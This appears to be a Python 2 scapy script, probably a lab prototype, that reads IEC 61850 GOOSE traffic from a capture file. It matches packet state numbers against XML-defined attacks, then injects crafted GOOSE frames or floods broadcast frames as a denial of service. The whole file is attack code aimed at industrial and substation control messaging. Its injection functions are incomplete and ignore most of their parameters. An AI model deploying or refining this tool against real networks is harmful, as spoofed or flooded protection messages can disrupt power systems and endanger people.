import xml.dom.minidom
from scapy.all import *
import goose


def readPCAP():

    #for packet in packets:
    #print (packet.summary())
    #print (packet.show())
    #print (packet['Ethernet'].dst)
    #print (hexdump(packet.load))
    #print (ls(packet))
    #print (packet.payload.show)
    #print (str(packet).encode("HEX"))
    #print ("\n")
    #break
  #print ("read GOOSe pcap file, to find stNum, sqNum, and MAC")
  i=0
  packets = rdpcap("Normal.pcapng")
  for pkt in packets:
      try:
          if  pkt.type == 0x8100  and i < 2:

              #print (hexdump(pkt))
              g = goose.GOOSE(pkt.load) #goose pkt
              #print (hexdump(pkt.load))
              #goose.GOOSE(str(pkt)).show()
              #print len(repr(g.load))
              #print len(pkt['Ethernet'].dst)
              print ('\n')
              #print ('\n')
              #print (hexdump(g))
              #print (hexdump(g.load[2:]))

              gpdu = goose.GOOSEPDU(g.load[2:])
              print gpdu.__dict__
              print ('\n')
              #packet = IP(dst="4.5.6.7",src="1.2.3.4")/TCP(dport=80, flags="S")/goose.GOOSE(APPID = 10)
              #send (packet)
              attr = gpdu.__dict__
              #print attr['stNum']
              #print attr['sqNum']

              stn = ord(goose.Integer.pack(attr['stNum']))
              print("stNum: %d" % stn)
              
              sqn = ord(goose.Integer.pack(attr['sqNum']))
              print("sqNum: %d" % sqn)

              MAC = pkt['Ethernet'].dst
              print ("dst MAC: %s" % MAC)

              parse_check(stn,sqn, MAC)

              #goose.GOOSE
              #send(pkt)

              #print (i['Ethernet'].dst)
              #print (i['Ethernet'].src)
              #if attr['stNum'] == goose.Integer(27):
              # print ('Eq')

              i+=1            
      except AttributeError:
          continue

            #send(pkt)
            #print (i['Ethernet'].dst)
            #print (i['Ethernet'].src)
            #if attr['stNum'] == goose.Integer(27):
            # print ('Eq')

def injectPKT(stNum,sqNum,MAC,data):
  #use scapy's send method, e.g., send(Ether(dst=MAC/goose.GOOSE(data))
  print ("Inject pkt: based on the received parameters")
  packet = Ether(dst=MAC)/goose.GOOSE(APPID=10)
  send(packet)

def dosPKTs(stNum,sqNum,frq,data):
  #use scapy's send method, e.g., send(goose.GOOSE(data))
  print ("DOS pkts: based on the received parameters")
  for x in range(frq):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/goose.GOOSE(APPID=10)
    send(packet)   
		 


def parse_check(stNum,sqNum,MAC):
# use the parse() function to load and parse an XML file
   doc = xml.dom.minidom.parse("xmlFile.xml");
  
# print out the document node and the name of the first child tag
   #print doc.nodeName
   #print doc.firstChild.tagName
    

# get a list of XML tags from the document and print each one
   attacks = doc.getElementsByTagName("attack")
   print ("\n")
   #print ("The xml file has %d defined attacks:" % attacks.length)
   for att in attacks:
     name = att.getAttribute("name")
     #print (name)
     cond = att.getElementsByTagName("cond")[0]
     stNum_c = int (cond.getAttributeNode("stNum").nodeValue)
     sqNum_c = int (cond.getAttributeNode("sqNum").nodeValue)
    
     if name == "InjectPkt":
          MAC_c = cond.getAttributeNode("MAC").nodeValue
     if name == "DOSPkts":
          freq = int (cond.getAttributeNode("freq").nodeValue)


     payload = att.getElementsByTagName("payload")[0]
     stNum_p = int (payload.getAttributeNode("stNum").nodeValue)
     sqNum_p = int (payload.getAttributeNode("sqNum").nodeValue)
     data = payload.getAttributeNode("data").nodeValue


	 #print("cond :%s, payload :%s"% (cond.firstChild.data, payload.firstChild.data))
     #print ("stNum_c %d" % stNum_c)
     #print ("sqNum_c %d" % sqNum_c)
     #print ("MAC %s" % MAC)

     #print ("stNum_p %d" % stNum_p)
     #print ("sqNum_p %d" % sqNum_p)
     #print ("data %s" % data)

     if stNum_c == stNum and sqNum == sqNum_c :
        if name == "InjectPkt":
           if MAC_c == MAC :
              #print ("packet should be injected by modifying stNum set to %d , sqNum set to %d , and data set to %s !" % (stNum_p , sqNum_p, data))
              print ('\n')
              print ('--------------------------------------------------------------')
              injectPKT(stNum_p,sqNum_p,MAC_c,data)
        elif name == "DOSPkts":
              #print ("%d packets should be flooded with stNum set to %d , sqNum set to %d , and data set to \" %s \"" % (freq,stNum_p , sqNum_p, data))
              print ('\n')
              print ('--------------------------------------------------------------')
              dosPKTs(stNum_p,sqNum_p,freq,data)




if __name__ == "__main__":
  readPCAP()

